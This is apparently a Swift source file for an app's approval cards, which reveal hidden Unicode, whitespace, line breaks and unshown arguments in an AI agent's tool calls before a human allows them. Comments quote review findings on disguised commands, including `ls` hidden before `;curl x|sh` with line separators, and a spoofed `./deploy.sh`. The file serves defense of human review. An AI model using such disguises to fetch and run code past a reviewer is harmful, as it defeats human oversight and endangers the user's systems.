import Foundation

/// Words for approval cards, and for the one line an approval becomes once
/// Mike has answered it.
public enum ApprovalText {
    /// The card's question: "Run this command?", "Write release.sh?".
    public static func title(_ request: ApprovalRequest) -> String {
        let file = filePath(request).map { shown(($0 as NSString).lastPathComponent) }
        switch request.name {
        case "Bash": return "Run this command?"
        case "Edit", "MultiEdit", "NotebookEdit": return file.map { "Edit \($0)?" } ?? "Edit this file?"
        case "Write": return file.map { "Write \($0)?" } ?? "Write this file?"
        case "WebFetch": return "Fetch this page?"
        case "WebSearch": return "Search the web?"
        default: return "Use \(toolName(request.name))?"
        }
    }

    /// What was asked for, for the line a settled approval becomes: the
    /// command's first line, "Write release.sh", the page, or the tool.
    public static func target(_ request: ApprovalRequest) -> String {
        let input = request.input
        switch request.name {
        case "Bash":
            // Named before it's split, so a U+2028 can't make `ls` alone
            // look like the line that was allowed.
            if let command = input["command"]?.stringValue, let line = firstLine(shown(command)) { return line }
        case "WebFetch":
            if let url = input["url"]?.stringValue, !url.isEmpty { return "Fetch " + shown(url) }
        case "WebSearch":
            if let query = input["query"]?.stringValue, !query.isEmpty { return "Search for " + shown(query) }
        default:
            break
        }
        var title = self.title(request)
        if title.hasSuffix("?") { title.removeLast() }
        return title
    }

    /// Why Threadbear's own tool is asking, in the runner's words ("Switch
    /// this thread to Full access"), for under the card's title: the
    /// generic "Use update thread?" alone hid what Allow allowed (Daybreak,
    /// 9 Nov 2026, finding 67). The fields below it are still all of it.
    public static func runnerReason(_ request: ApprovalRequest) -> String? {
        guard request.name.hasPrefix("mcp__threadbear__") else { return nil }
        let title = request.title.trimmingCharacters(in: .whitespacesAndNewlines)
        return title.isEmpty ? nil : shown(title)
    }

    /// `shown`, with the whitespace a diff or a command can hide made
    /// visible: a tab as `⇥` (it was drawn as four spaces, so swapping one
    /// for the other drew nothing, and a `<<-` heredoc ends on one), and
    /// spaces at a line's end as `·`. For what Allow runs or writes: a
    /// command and an edit's lines (Codex review, 10 Nov 2026).
    public static func shownExactly(_ text: String) -> String {
        shown(text).split(separator: "\n", omittingEmptySubsequences: false).map { line -> String in
            let body = String(line)
            var kept = body
            while kept.hasSuffix(" ") { kept.removeLast() }
            return kept.replacingOccurrences(of: "\t", with: "\u{21E5}   ") + String(repeating: "\u{B7}", count: body.count - kept.count)
        }.joined(separator: "\n")
    }

    /// What a file card's diff doesn't draw, which Allow allows too: every
    /// argument but the path and the text the diff shows (`replace_all`, a
    /// notebook cell's id and kind, an edit's own flags), named as for a
    /// command (Codex review, 10 Nov 2026: `replace_all: true` and
    /// `false` drew the same card).
    public static func fieldsBeyondDiff(_ input: JSONValue) -> [ToolPresentation.Field] {
        let drawn: Set<String> = ["file_path", "notebook_path", "path", "content", "old_string", "new_string", "edits"]
        var out = ToolPresentation.fields(input, whole: true).filter { !drawn.contains($0.key) }
        if case .array(let edits)? = input["edits"] {
            for (i, edit) in edits.enumerated() {
                var rest: JSONValue?
                if case .object(let fields) = edit {
                    let kept = fields.filter { $0.key != "old_string" && $0.key != "new_string" }
                    if !kept.isEmpty { rest = .object(kept) }
                } else {
                    rest = edit
                }
                if let rest {
                    out.append(ToolPresentation.Field(key: "edit \(i + 1)", value: rest.compactText))
                }
            }
        }
        out += lineBreakNotes(input)
        return shown(out)
    }

    /// Whether an edit's new text ends with a line break where its old text
    /// doesn't, or the other way round: a diff drawn by lines can't show it,
    /// and it moves the next line of the file (a commented-out `rm` onto a
    /// line of its own, Codex review, 10 Nov 2026).
    public static func lineBreakNotes(_ input: JSONValue) -> [ToolPresentation.Field] {
        func note(_ key: String, _ edit: JSONValue) -> ToolPresentation.Field? {
            guard let old = edit["old_string"]?.stringValue, let new = edit["new_string"]?.stringValue else { return nil }
            switch (old.hasSuffix("\n"), new.hasSuffix("\n")) {
            case (false, true): return ToolPresentation.Field(key: key, value: "the new text adds a line break at its end, so what follows it starts a new line")
            case (true, false): return ToolPresentation.Field(key: key, value: "the new text drops the line break at its end, so what follows it joins its last line")
            default: return nil
            }
        }
        var out = [note("line break", input)].compactMap { $0 }
        // A whole file that doesn't end with one (a cron entry needs it).
        if let content = input["content"]?.stringValue, !content.isEmpty, !content.hasSuffix("\n") {
            out.append(ToolPresentation.Field(key: "line break", value: "the file doesn't end with a line break"))
        }
        if case .array(let edits)? = input["edits"] {
            out += edits.enumerated().compactMap { note("edit \($0.offset + 1) line break", $0.element) }
        }
        return out
    }

    /// The decision in a word or two.
    public static func decision(_ decision: ApprovalDecision) -> String {
        switch decision {
        case .allow: return "Allowed"
        case .allowAlways: return "Always allowed"
        case .deny: return "Denied"
        case .answered: return "Answered"
        case .expired: return "Expired when the runner restarted"
        }
    }

    /// `text` as an approval card shows it: every character that would
    /// break a line, hide, or reorder what's drawn is written out by name
    /// instead (`⟨U+2028⟩`), as the shell reads it as an ordinary
    /// character. Controls other than a line break and a tab, format
    /// characters (bidi overrides and isolates, zero-width ones, the
    /// byte-order mark), the line and paragraph separators, characters that
    /// draw as nothing, spaces other than the plain one, and right-to-left
    /// letters. A line
    /// break and a tab are left: the shell reads those as they look. A
    /// carriage return isn't: it draws as a new line, and bash reads it
    /// as part of a word (security review, 9 Nov 2026: `ls`, six U+2028
    /// and `;curl x|sh` looked like `ls` on its own). The runner lets
    /// only the Mac connected straight to it allow such a call
    /// (runner/src/tools.ts, HIDES_OR_REORDERS).
    public static func shown(_ text: String) -> String {
        guard text.unicodeScalars.contains(where: hides) else { return text }
        var out = ""
        out.unicodeScalars.reserveCapacity(text.unicodeScalars.count)
        for scalar in text.unicodeScalars {
            if hides(scalar) {
                out += "\u{27E8}U+" + String(format: "%04X", scalar.value) + "\u{27E9}"
            } else {
                out.unicodeScalars.append(scalar)
            }
        }
        return out
    }

    /// The same for a card's fields, keys and values.
    public static func shown(_ fields: [ToolPresentation.Field]) -> [ToolPresentation.Field] {
        fields.map { ToolPresentation.Field(key: shown($0.key), value: shown($0.value)) }
    }

    private static func hides(_ scalar: Unicode.Scalar) -> Bool {
        if scalar == "\n" || scalar == "\t" { return false }
        // Characters that draw as nothing though they're there (a combining
        // grapheme joiner, variation selectors, Hangul fillers), spaces that
        // aren't the shell's space, and the braille blank (Codex's review,
        // 9 Nov 2026: `./deploy` + U+034F + `.sh` looked like `./deploy.sh`).
        if scalar.properties.isDefaultIgnorableCodePoint || scalar.value == 0x2800 { return true }
        if scalar.properties.generalCategory == .spaceSeparator { return scalar != " " }
        // Right-to-left letters turn the `;` and `|` around them round with
        // no control character at all, so the order drawn isn't the order run.
        if rightToLeft(scalar.value) { return true }
        switch scalar.properties.generalCategory {
        case .control, .format, .lineSeparator, .paragraphSeparator: return true
        default: return false
        }
    }

    /// Hebrew, Arabic, Syriac, Thaana, N'Ko and the other right-to-left
    /// scripts' blocks, and their presentation forms.
    private static func rightToLeft(_ v: UInt32) -> Bool {
        (0x0590...0x08FF).contains(v) || (0xFB1D...0xFDFF).contains(v) || (0xFE70...0xFEFF).contains(v)
            || (0x10800...0x10FFF).contains(v) || (0x1E800...0x1EFFF).contains(v)
    }

    /// The file a request would write or edit, if it names one.
    public static func filePath(_ request: ApprovalRequest) -> String? {
        let path = request.input["file_path"]?.stringValue ?? request.input["notebook_path"]?.stringValue ?? request.input["path"]?.stringValue
        return path.flatMap { $0.isEmpty ? nil : $0 }
    }

    /// The answers to a question card in one line, in the order the
    /// questions were asked: what the card shows once it's answered. The
    /// runner keeps it as the resolution's `message` (it only hands the
    /// `answers` map to the CLI), so the choice is still there after the
    /// app restarts or the thread is opened again.
    public static func answerSummary(_ request: QuestionRequest, answers: [String: String]) -> String {
        request.questions.compactMap { question in
            answers[question.question].flatMap { $0.isEmpty ? nil : $0 }
        }.joined(separator: "; ")
    }

    /// "mcp__github__get_pull_request" is "github get_pull_request".
    static func toolName(_ name: String) -> String {
        let parts = name.split(separator: "_", omittingEmptySubsequences: true)
        return name.hasPrefix("mcp__") && parts.count >= 3 ? parts.dropFirst(2).joined(separator: " ") : name
    }

    static func firstLine(_ text: String) -> String? {
        let line = text.split(whereSeparator: \.isNewline).first.map { $0.trimmingCharacters(in: .whitespaces) } ?? ""
        guard !line.isEmpty else { return nil }
        return line.count > 160 ? String(line.prefix(159)) + "…" : line
    }
}

/// The plan card's title: how far along it is.
public enum PlanSummary {
    /// "2 of 5 steps done", or "All 3 steps done" at the end.
    public static func title(_ entries: [PlanEntry]) -> String {
        let total = entries.count
        let done = entries.filter { $0.status == .completed }.count
        let steps = total == 1 ? "step" : "steps"
        if total == 0 { return "No steps yet" }
        if done == total { return total == 1 ? "1 step done" : "All \(total) steps done" }
        return "\(done) of \(total) \(steps) done"
    }
}

/// The plan card's words ("Plan first").
public enum PlanCardText {
    /// A plan that starts with a heading ("# Plan: add CSV export"): that
    /// heading (or "## Add bye.txt"), for the card's title, and the plan after it. Under a
    /// "Plan" title of its own the heading said Plan twice.
    public static func split(_ plan: String) -> (title: String?, body: String) {
        let trimmed = plan.trimmingCharacters(in: .whitespacesAndNewlines)
        // Any level: Codex starts its plans with "## Add bye.txt".
        let end = trimmed.firstIndex(of: "\n") ?? trimmed.endIndex
        let first = trimmed[..<end]
        let hashes = first.prefix { $0 == "#" }.count
        guard (1...3).contains(hashes), first.dropFirst(hashes).first == " " else { return (nil, trimmed) }
        let title = first.dropFirst(hashes).trimmingCharacters(in: .whitespaces)
        let body = trimmed[end...].trimmingCharacters(in: .whitespacesAndNewlines)
        return title.isEmpty ? (nil, trimmed) : (title, body)
    }

    /// How many lines of a long plan the card shows before "Show full plan".
    public static let previewLines = 12

    /// The start of a long plan, cut at a line, and whether anything was
    /// left out. A plan of up to a couple more lines than that shows whole,
    /// rather than hiding one line behind a button.
    public static func preview(_ plan: String, lines limit: Int = previewLines) -> (text: String, clipped: Bool) {
        let lines = plan.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "\n")
        guard lines.count > limit + 2 else { return (plan.trimmingCharacters(in: .whitespacesAndNewlines), false) }
        var kept = Array(lines.prefix(limit))
        // Don't end on a heading or a blank line: they read as cut off.
        while let last = kept.last, last.trimmingCharacters(in: .whitespaces).isEmpty || last.hasPrefix("#") { kept.removeLast() }
        // An open code fence would swallow the rest of the card.
        if kept.filter({ $0.trimmingCharacters(in: .whitespaces).hasPrefix("```") }).count % 2 == 1 { kept.append("```") }
        return (kept.joined(separator: "\n"), true)
    }

    /// The plan's first line of prose, for a one-line mention (a dump, a
    /// notification): its heading's words if that's all there is.
    public static func summary(_ plan: String) -> String {
        let lines = plan.split(separator: "\n").map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
        let prose = lines.first { !$0.hasPrefix("#") } ?? lines.first ?? ""
        let line = prose.drop { $0 == "#" || $0 == " " }
        return line.count > 160 ? String(line.prefix(159)) + "…" : String(line)
    }
}
